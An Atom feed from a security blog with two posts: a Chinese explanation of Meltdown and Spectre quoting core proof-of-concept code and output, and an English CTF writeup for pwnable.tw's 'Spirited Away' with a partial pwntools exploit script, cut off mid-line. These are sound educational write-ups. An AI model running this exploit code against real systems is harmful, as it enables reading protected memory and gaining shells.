<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WeaponX&#39;s Blog</title>
  <subtitle>Binary</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://weaponx.site/"/>
  <updated>2018-01-09T14:18:59.888Z</updated>
  <id>http://weaponx.site/</id>
  
  <author>
    <name>WeaponX</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>从CPU漏洞Meltdown&amp;Spectre（CVE-2017-5754,CVE-2017-5715,CVE-2017-5753）看侧信道攻击</title>
    <link href="http://weaponx.site/2018/01/09/%E4%BB%8ECPU%E6%BC%8F%E6%B4%9EMeltdown-Spectre%EF%BC%88CVE-2017-5754-CVE-2017-5715-CVE-2017-5753%EF%BC%89%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/"/>
    <id>http://weaponx.site/2018/01/09/从CPU漏洞Meltdown-Spectre（CVE-2017-5754-CVE-2017-5715-CVE-2017-5753）看侧信道攻击/</id>
    <published>2018-01-09T14:16:55.000Z</published>
    <updated>2018-01-09T14:18:59.888Z</updated>
    
    <content type="html"><![CDATA[<h2 id="从CPU漏洞Meltdown-amp-Spectre（CVE-2017-5754-CVE-2017-5715-CVE-2017-5753）看侧信道攻击"><a href="#从CPU漏洞Meltdown-amp-Spectre（CVE-2017-5754-CVE-2017-5715-CVE-2017-5753）看侧信道攻击" class="headerlink" title="从CPU漏洞Meltdown&amp;Spectre（CVE-2017-5754,CVE-2017-5715,CVE-2017-5753）看侧信道攻击"></a>从CPU漏洞Meltdown&amp;Spectre（CVE-2017-5754,CVE-2017-5715,CVE-2017-5753）看侧信道攻击</h2><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>2018伊始，两个芯片级漏洞<code>Meltdown</code>（熔断）、<code>Spectre</code>（幽灵）漏洞震惊的安全界。受影响的CPU包括<code>Intel</code>、<code>AMD</code>和<code>ARM</code>，基本囊括的消费级CPU市场的绝大部分。<code>Meltdown</code>漏洞可以在用户态越权读取内核态的内存数据，<code>Spectre</code>漏洞可以通过浏览器的<code>Javascript</code>读取用户态的内存数据。虽然这两个漏洞对个人PC影响有限，但是确摧毁了公有云的基石——用户可在虚拟机里可以无限制的读取宿主机或者其他虚拟机的数据。</p>
<h2 id="0x01-背景知识"><a href="#0x01-背景知识" class="headerlink" title="0x01 背景知识"></a>0x01 背景知识</h2><p>了解<code>Meltdown</code>和<code>Spectre</code>漏洞之前，首先要知道几个背景知识。现代CPU为了提高运算效率与运算速度，会采用以下的手段提高CPU运算速度：分支预测（<code>branch prediction</code>）、推测执行（<code>speculation execution</code>）和乱序执行（<code>out-of-order execution</code>）。</p>
<ul>
<li><p>分支预测与推测执行</p>
<p>当包含CPU处理分支指令时就会遇到一个问题，根据判定条件的真/假的不同，有可能会产生跳转。此时CPU不会等待判定结果，而回预测出某一个条件分支去执行。</p>
</li>
<li><p>乱序执行</p>
<p>CPU遇到指令依赖的情况时，会转向下条不依赖的指令去执行。</p>
<p>​</p>
</li>
</ul>
<h2 id="0x02-Meltdown漏洞分析"><a href="#0x02-Meltdown漏洞分析" class="headerlink" title="0x02 Meltdown漏洞分析"></a>0x02 Meltdown漏洞分析</h2><p><code>Meltdown</code>漏洞允许我们在用户态无限制的读取内核态的数据。我们来看一段代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">; rcx = kernel space address</div><div class="line">; rbx = user space address</div><div class="line">mov al, byte[rcx]</div><div class="line">shl al, 0xc</div><div class="line">mov rbx, qword[rbx + rax]</div></pre></td></tr></table></figure>
<p>这段代码看上去并没有什么问题。因为在用户态的时候，在执行第一行代码时就会因为鉴权失败而停止执行后面的代码。</p>
<p>然而，当现代CPU执行这一段代码时，由于之前提到的特性，CPU为了加快运算速度，在执行完第一行代码后，在耗时的鉴权时，会执行第二行、第三行代码。当鉴权失败后，CPU会将状态回滚，当作后面的代码没有执行，此时用户态程序还是没法获取到内核态的数据。</p>
<p>但是，问题来了。CPU状态回滚后，缓存Cache并不会回滚，我们还是可以通过侧信道攻击（<code>Side Channel  Attack</code>）来猜测内核态的数据。此时，我们还要知道两点：第一，当CPU访问一个地址时，若没有在缓存中则会将这个地址所在的内存页（4KB = 4096B）放入缓存中；第二，访问缓存数据的速度远大于访问内存。</p>
<p>这段代码在第一行取了<code>kernel address</code>存放的第一字节的数据，第二行将这个数据左移<code>0xc</code>位，相当于乘以<code>4096</code>，也就是<code>4K</code>。此时，这个数据就相当于一个内存页的<code>index</code>序号。第三行代码访问了这个地址，此时CPU会将这个内存页放入缓存中。接下来，我们遍历一下<code>index</code>从0到255号内存页，访问特别短的那个内存页的序号就是我们要猜测的数据。</p>
<p>下面，我们通过图解来展示一下这个漏洞的原理。</p>
<p>第一步，将<code>kernel space address</code>的第一字节放入<code>rax</code>的低<code>8</code>位，假设为<code>0x20</code>。</p>
<p><img src="1.png" alt=""></p>
<p>第二步，将<code>rax</code>的低8位左移<code>0xc</code>位，也就是<code>0x20 * 4096</code>。</p>
<p>第三步，访问<code>rbx + rax</code>也就是<code>rbx + 0x20 * 4096</code>，此时会将这个地址所在的内存页放入缓存中。</p>
<p>第四部，遍历<code>rbx + index * 4096</code>，若缓存命中，则说明此时的<code>index</code>就是<code>rcx</code>指向的内核态的第一字节数据。</p>
<p><img src="2.png" alt=""></p>
<p>此时，访问<code>rbx + 0x20 * 4096</code>命中缓存，所以<code>rcx</code> 指向内核态的第一字节数据为<code>0x20</code> 。</p>
<p>接下来，我们看看<code>Github</code>上放出的<code>PoC</code>代码<a href="https://github.com/paboldin/meltdown-exploit/。因为这个代码同时支持`x86_64`和`i386`，所以核心汇编代码有两段。" target="_blank" rel="external">https://github.com/paboldin/meltdown-exploit/。因为这个代码同时支持`x86_64`和`i386`，所以核心汇编代码有两段。</a></p>
<ul>
<li><p>x86_64</p>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line">asm volatile (</div><div class="line">    "1:\n\t"</div><div class="line">    ".rept 300\n\t"</div><div class="line">    "add $0x141, %%rax\n\t"</div><div class="line">    ".endr\n\t"</div><div class="line">    "movzx (%[addr]), %%eax\n\t"</div><div class="line">    "shl $12, %%rax\n\t"</div><div class="line">    "jz 1b\n\t"</div><div class="line">    "movzx (%[target], %%rax, 1), %%rbx\n"</div><div class="line">    "stopspeculate: \n\t"</div><div class="line">    "nop\n\t"</div><div class="line">    :</div><div class="line">    : [target] "r" (target_array),</div><div class="line">      [addr] "r" (addr)</div><div class="line">    : "rax", "rbx"</div><div class="line">);</div></pre></td></tr></table></figure>
<p>​</p>
</li>
<li><p>i386</p>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line">asm volatile (</div><div class="line">  "1:\n\t"</div><div class="line">  ".rept 300\n\t"</div><div class="line">  "add $0x141, %%eax\n\t"</div><div class="line">  ".endr\n\t"</div><div class="line">  "movzx (%[addr]), %%eax\n\t"</div><div class="line">  "shl $12, %%eax\n\t"</div><div class="line">  "jz 1b\n\t"</div><div class="line">  "movzx (%[target], %%eax, 1), %%ebx\n"</div><div class="line">  "stopspeculate: \n\t"</div><div class="line">  "nop\n\t"</div><div class="line">  :</div><div class="line">  : [target] "r" (target_array),</div><div class="line">    [addr] "r" (addr)</div><div class="line">  : "rax", "rbx"</div><div class="line">);</div></pre></td></tr></table></figure>
<p>接着，我们看看这个<code>PoC</code>是如何判断是否命中<code>Cache</code>。首先<code>get_access_time</code>函数用来计算访问一个地址需要的时间。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span></div><div class="line"><span class="title">get_access_time</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">char</span> *addr)</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> time1, time2, junk;</div><div class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> j;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> HAVE_RDTSCP</span></div><div class="line">  time1 = __rdtscp(&amp;junk);</div><div class="line">  j = *addr;</div><div class="line">  time2 = __rdtscp(&amp;junk);</div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line">  time1 = __rdtsc();</div><div class="line">  j = *addr;</div><div class="line">  _mm_mfence();</div><div class="line">  time2 = __rdtsc();</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">  <span class="keyword">return</span> time2 - time1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>接着通过计算缓存命中，和缓存未命中的时间得到一个阈值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ESTIMATE_CYCLES   1000000</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></div><div class="line"><span class="title">set_cache_hit_threshold</span><span class="params">(<span class="keyword">void</span>)</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">long</span> cached, uncached, i;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (<span class="number">0</span>) &#123;</div><div class="line">      cache_hit_threshold = <span class="number">80</span>;</div><div class="line">      <span class="keyword">return</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">for</span> (cached = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; ESTIMATE_CYCLES; i++)</div><div class="line">      cached += get_access_time(target_array);</div><div class="line"></div><div class="line">  <span class="keyword">for</span> (cached = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; ESTIMATE_CYCLES; i++)</div><div class="line">      cached += get_access_time(target_array);</div><div class="line"></div><div class="line">  <span class="keyword">for</span> (uncached = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; ESTIMATE_CYCLES; i++) &#123;</div><div class="line">      _mm_clflush(target_array);</div><div class="line">      uncached += get_access_time(target_array);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  cached /= ESTIMATE_CYCLES;</div><div class="line">  uncached /= ESTIMATE_CYCLES;</div><div class="line"></div><div class="line">  cache_hit_threshold = mysqrt(cached * uncached);</div><div class="line"></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"cached = %ld, uncached = %ld, threshold %d\n"</span>,</div><div class="line">         cached, uncached, cache_hit_threshold);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>给出我的机器上某次执行的结果<code>cached = 37, uncached = 218, threshold 89</code> 。明显可以看出，缓存命中需要的访问时间远远小于缓存未命中需要的时间。因此可以通过判断访问某个地址是否大于计算出的阈值来判断这个内存页是否被缓存过。</p>
<p>猜测的函数如下：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> CYCLES 1000</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">readbyte</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> i, ret = <span class="number">0</span>, max = <span class="number">-1</span>, maxi = <span class="number">-1</span>;</div><div class="line">  <span class="keyword">static</span> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"></div><div class="line">  <span class="built_in">memset</span>(hist, <span class="number">0</span>, <span class="keyword">sizeof</span>(hist));</div><div class="line"></div><div class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; CYCLES; i++) &#123;</div><div class="line">      ret = pread(fd, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</div><div class="line">      <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</div><div class="line">          perror(<span class="string">"pread"</span>);</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      clflush_target();</div><div class="line"></div><div class="line">      speculate(addr);  <span class="comment">// 核心函数</span></div><div class="line">      check();          <span class="comment">// 判断哪个index命中cache</span></div><div class="line">  &#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></div><div class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; VARIANTS_READ; i++)</div><div class="line">      <span class="keyword">if</span> (hist[i] &gt; <span class="number">0</span>)</div><div class="line">          <span class="built_in">printf</span>(<span class="string">"addr %lx hist[%x] = %d\n"</span>, addr, i, hist[i]);</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; VARIANTS_READ; i++) &#123;</div><div class="line">      <span class="keyword">if</span> (!<span class="built_in">isprint</span>(i))</div><div class="line">          <span class="keyword">continue</span>;</div><div class="line">      <span class="keyword">if</span> (hist[i] &amp;&amp; hist[i] &gt; max) &#123;</div><div class="line">          max = hist[i];</div><div class="line">          maxi = i;</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> maxi;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>  这个<code>PoC</code>是使用方法是<code>meltdown addr length</code>，从<code>addr</code>的地址里读取<code>length</code>的数据。这个<code>PoC</code>以读取<code>/proc/version</code>为例，<code>/proc/version</code>的实现方法较复杂，在此不详细解释。</p>
<p>这篇文章阐述了<code>Linux</code>内核如何渲染<code>/proc/version</code>文件的。所以，我们需要得到<code>linux_proc_banner</code>的基址。因为Linux存在ASLR，所以这个<code>PoC</code>用了一种投机取巧的方法，从<code>/proc/kallsyms</code>读了<code>linux_proc_banner</code>的地址，因此需要<code>root</code>权限。</p>
<p>最终执行结果如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">cached = <span class="number">37</span>, uncached = <span class="number">222</span>, threshold <span class="number">90</span></div><div class="line">read ffffffff81800060 = <span class="number">25</span> % (score=<span class="number">1</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800061 = <span class="number">73</span> s (score=<span class="number">4</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800062 = <span class="number">20</span>   (score=<span class="number">3</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800063 = <span class="number">76</span> v (score=<span class="number">2</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800064 = <span class="number">65</span> e (score=<span class="number">2</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800065 = <span class="number">72</span> r (score=<span class="number">2</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800066 = <span class="number">73</span> s (score=<span class="number">2</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800067 = <span class="number">69</span> i (score=<span class="number">2</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800068 = <span class="number">6f</span> o (score=<span class="number">1</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff81800069 = <span class="number">6</span>e n (score=<span class="number">1</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff8180006a = <span class="number">20</span>   (score=<span class="number">4</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff8180006b = <span class="number">25</span> % (score=<span class="number">3</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff8180006c = <span class="number">73</span> s (score=<span class="number">3</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff8180006d = <span class="number">20</span>   (score=<span class="number">3</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff8180006e = <span class="number">28</span> ( (score=<span class="number">1</span>/<span class="number">1000</span>)</div><div class="line">read ffffffff8180006f = <span class="number">62</span> b (score=<span class="number">2</span>/<span class="number">1000</span>)</div><div class="line">VULNERABLE</div></pre></td></tr></table></figure>
<p>不得不说，很牛逼！</p>
<h2 id="0x03-Spectre漏洞分析"><a href="#0x03-Spectre漏洞分析" class="headerlink" title="0x03 Spectre漏洞分析"></a>0x03 Spectre漏洞分析</h2><p><code>Spectre</code>漏洞与<code>Meltdown</code>漏洞不同的是，<code>Spectre</code>漏洞允许读取本进程地址空间的任意数据。重要的是这个可以远程攻击，利用<code>JIT</code>的翻译机制，构造恶意<code>Javascript</code>代码来读取浏览器进程空间中别的网站的<code>cookie</code>等！就是一个超级<code>UXSS</code>！危害可见一斑。</p>
<p>其实<code>Spectre</code>存在两个漏洞，也就是两个CVE-2017-5753和CVE-2017-5715。其中CVE-2017-5715是分支预测注入漏洞<code>BranchTarget Injection</code>目前没发现公开的<code>PoC</code>，CVE-2017-5753是边界检查绕过漏洞<code>BoundsCheck Bypass</code>有公开的<code>PoC</code>，下面分析这段<code>PoC</code> 。</p>
<p>首先，我们来看一段代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> array1_size = <span class="number">16</span>;</div><div class="line"><span class="keyword">uint8_t</span> array1[<span class="number">160</span>]  = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span> &#125;;</div><div class="line"><span class="keyword">uint8_t</span> array2[<span class="number">256</span> * <span class="number">512</span>];</div><div class="line"><span class="keyword">uint8_t</span> temp = <span class="number">0</span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">victim_function</span><span class="params">(<span class="keyword">size_t</span> x)</span> </span>&#123;  </div><div class="line">    <span class="keyword">if</span> (x &lt; array1_size) &#123;  </div><div class="line">        temp &amp;= array2[array1[x] * <span class="number">512</span>];  </div><div class="line">    &#125;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>很明显，代码有边界检查，我们无法越界读取别的地址的数据。但是，在CPU执行判断时，CPU会通过预测执行来执行<code>temp &amp;= array2[array1[x] * 512]</code>。 最后，因为判断不成立，所以状态回滚。根据<code>Meltdown</code>中的知识，我们可以知道，访问<code>array1[x]</code>和<code>array2[array1[x] * 512]</code>后，会将这两个数据缓存下来，而且回滚后缓存不清除。此时<code>array2[array1[x] * 512]</code>所在的物理页会被缓存，我们只需要遍历<code>0 - 255</code>即可猜到<code>array1[x]</code>的值。</p>
<h2 id="0x04-侧信道攻击"><a href="#0x04-侧信道攻击" class="headerlink" title="0x04 侧信道攻击"></a>0x04 侧信道攻击</h2><p>之前tombkeeper教主曾在QCon2017的演讲《代码未写，漏洞已出——架构和设计的安全》中讲过一个例子，在Java 6.0时代，在信息摘要类中有一个函数<code>isEqual</code>用来验证<code>HMAC</code>等数据，它的实现如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isEqual</span><span class="params">(<span class="keyword">byte</span> digesta[], <span class="keyword">byte</span> digestb[])</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> (digesta.length != digestb.length)</div><div class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; digesta.length; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (digesta[i] != digestb[i])&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个函数看来貌似没有什么问题，但是我们假设<code>digestb</code>是我们已有的密钥，<code>digesta</code>是用户传入的密钥。程序匹配到两个密钥相同位不等的时候会退出。但是只要我们一位一位去猜，就可以利用微小的时间差将猜测速度提升无数倍。</p>
<p>在2017年年初，就有一篇论文<code>ASLR on the Line: Practical Cache Attacks on the MMU</code>描述了通过Javascript侧信道攻击绕过系统的ASLR。</p>
<p>可见这种平常我们不会注意到的问题越来越成为了计算机安全的一种威胁。</p>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>其实，侧信道攻击说到底还是设计上的缺陷，在为速度考虑的同时也需要考虑安全因素。</p>
<blockquote>
<p>在计算机中处理的数据，除了关注类型、长度、内容，还要考虑时间因子。什么时候时间开始，什么时候时间结束，持续多久，这些往往会影响安全。<br>–Tombkeeper</p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;从CPU漏洞Meltdown-amp-Spectre（CVE-2017-5754-CVE-2017-5715-CVE-2017-5753）看侧信道攻击&quot;&gt;&lt;a href=&quot;#从CPU漏洞Meltdown-amp-Spectre（CVE-2017-5754-CVE-
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Spirited Away Writeup[pwnable.pw]</title>
    <link href="http://weaponx.site/2017/12/03/Spirited-Away-Writeup-pwnable-pw/"/>
    <id>http://weaponx.site/2017/12/03/Spirited-Away-Writeup-pwnable-pw/</id>
    <published>2017-12-04T01:31:29.000Z</published>
    <updated>2017-12-04T01:32:19.872Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p><code>spirited_away</code> is a ELF 32-bit LSB executable binary. We quickly figured out the function <code>survey</code>.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">survey</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> s[<span class="number">56</span>]; <span class="comment">// [sp+10h] [bp-E8h]@2</span></div><div class="line">  <span class="keyword">size_t</span> len_60; <span class="comment">// [sp+48h] [bp-B0h]@1</span></div><div class="line">  <span class="keyword">size_t</span> len_80; <span class="comment">// [sp+4Ch] [bp-ACh]@1</span></div><div class="line">  <span class="keyword">char</span> comment[<span class="number">80</span>]; <span class="comment">// [sp+50h] [bp-A8h]@2</span></div><div class="line">  <span class="keyword">int</span> age; <span class="comment">// [sp+A0h] [bp-58h]@2</span></div><div class="line">  <span class="keyword">void</span> *name; <span class="comment">// [sp+A4h] [bp-54h]@2</span></div><div class="line">  <span class="keyword">char</span> reason[<span class="number">80</span>]; <span class="comment">// [sp+A8h] [bp-50h]@2</span></div><div class="line"></div><div class="line">  len_60 = <span class="number">60</span>;                                  <span class="comment">// overflow</span></div><div class="line">  len_80 = <span class="number">80</span>;</div><div class="line">LABEL_2:</div><div class="line">  <span class="built_in">memset</span>(comment, <span class="number">0</span>, <span class="number">80u</span>);</div><div class="line">  name = <span class="built_in">malloc</span>(<span class="number">60u</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"\nPlease enter your name: "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  read(<span class="number">0</span>, name, len_60);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Please enter your age: "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;age);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Why did you came to see this movie? "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  read(<span class="number">0</span>, reason, len_80);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Please enter your comment: "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  read(<span class="number">0</span>, comment, len_60);</div><div class="line">  ++cnt;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, name);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Age: %d\n"</span>, age);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Reason: %s\n"</span>, reason);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Comment: %s\n\n"</span>, comment);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="built_in">sprintf</span>(s, <span class="string">"%d comment so far. We will review them as soon as we can"</span>, cnt);</div><div class="line">  <span class="built_in">puts</span>(s);</div><div class="line">  <span class="built_in">puts</span>(&amp;::s);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="keyword">if</span> ( cnt &gt; <span class="number">199</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"200 comments is enough!"</span>);</div><div class="line">    fflush(<span class="built_in">stdout</span>);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>);</div><div class="line">    fflush(<span class="built_in">stdout</span>);</div><div class="line">    read(<span class="number">0</span>, &amp;choice, <span class="number">3u</span>);</div><div class="line">    <span class="keyword">if</span> ( choice == <span class="string">'Y'</span> || choice == <span class="string">'y'</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">free</span>(name);</div><div class="line">      <span class="keyword">goto</span> LABEL_2;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ( choice == <span class="string">'N'</span> || choice == <span class="string">'n'</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong choice."</span>);</div><div class="line">    fflush(<span class="built_in">stdout</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</div><div class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>We found the variable in function <code>survey</code> named <strong>cnt</strong> which is a global variable. This variable use for counting guests.Then we find the string concatenation in function <code>survey</code> on address <code>0x080487CC</code>. The code concatenates <em>%d comment so far. We will review them as soon as we can</em> and global variable <code>cnt</code> and stored in stack with 56 Bytes.Things become interesting, <code>comment so far. We will review them as soon as we can</code> already 54 Bytes. It means that if we have 10 guests buffer overflow will occur.We also find that if we have 100 guests, the last latter <code>n</code> will overwrite the local variable <code>len_60</code> using for limiting input length. The value of the variable will be overwritten to 110 (ASCII n).It means we can input 110 Bytes in <code>name</code> and <code>comment</code>.That will cause another buffer overflow.</p>
<p><img src="1.png" alt=""></p>
<p>We also find UAF vulnerability in this function.</p>
<p><img src="2.png" alt=""></p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>According to the analysis above, we know that buffer overflow vulnerabilities in function <code>survey</code>. But how can we use these vulnerabilities for exploiting? </p>
<p>The scenario looks simple.</p>
<ul>
<li>dup chunk into stack</li>
<li>ROP for info leak</li>
<li>ROP for get shell</li>
</ul>
<p>Firstly, We create fake heap chunk in stack and overwrite the heap chunk pointer.</p>
<p>Secondly, we add another guest. Fake chunk will be freed</p>
<p>Finally, function realloc the heap chunk by using <code>malloc()</code>  and get a fake heap chunk we can entirely control.</p>
<p>We can input info leak ROP chain into fake heap chunk by overwriting the return address. Then we can get <code>system</code> and <code>/bin/sh</code> address in libc. We can do it again for getting shell.</p>
<p>Final Exploit</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">"DEBUG"</span></div><div class="line"></div><div class="line">r = process(<span class="string">"./spirited_away"</span>)</div><div class="line">r = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10204</span>)</div><div class="line"></div><div class="line">elf = ELF(<span class="string">"./spirited_away"</span>)</div><div class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_comment</span><span class="params">(name, age, reason, comment)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">"Please enter your name: "</span>)</div><div class="line">    r.send(name)</div><div class="line">    r.recvuntil(<span class="string">"Please enter your age: "</span>)</div><div class="line">    r.sendline(age)</div><div class="line">    r.recvuntil(<span class="string">"Why did you came to see this movie? "</span>)</div><div class="line">    r.send(reason)</div><div class="line">    r.recvuntil(<span class="string">"Please enter your comment: "</span>)</div><div class="line">    r.send(comment)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_leave_comment</span><span class="params">(age, reason)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">"Please enter your age: "</span>)</div><div class="line">    r.sendline(age)</div><div class="line">    r.recvuntil(<span class="string">"Why did you came to see this movie? "</span>)</div><div class="line">    r.send(reason)</div><div class="line">    </div><div class="line"></div><div class="line">leave_comment(<span class="string">"1"</span>, <span class="string">"1"</span>, <span class="string">"1"</span>, <span class="string">"1"</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">9</span>):</div><div class="line">    r.recvuntil(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>)</div><div class="line">    r.send(<span class="string">"y"</span>)</div><div class="line">    leave_comment(<span class="string">"aaa"</span>, <span class="string">"11"</span>, <span class="string">"ccc"</span>, <span class="string">"ddd"</span>)</div><div class="line"> </div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">9</span>, <span class="number">98</span>):</div><div class="line">    r.recvuntil(<span class="string">"Would you like to leave another comment? 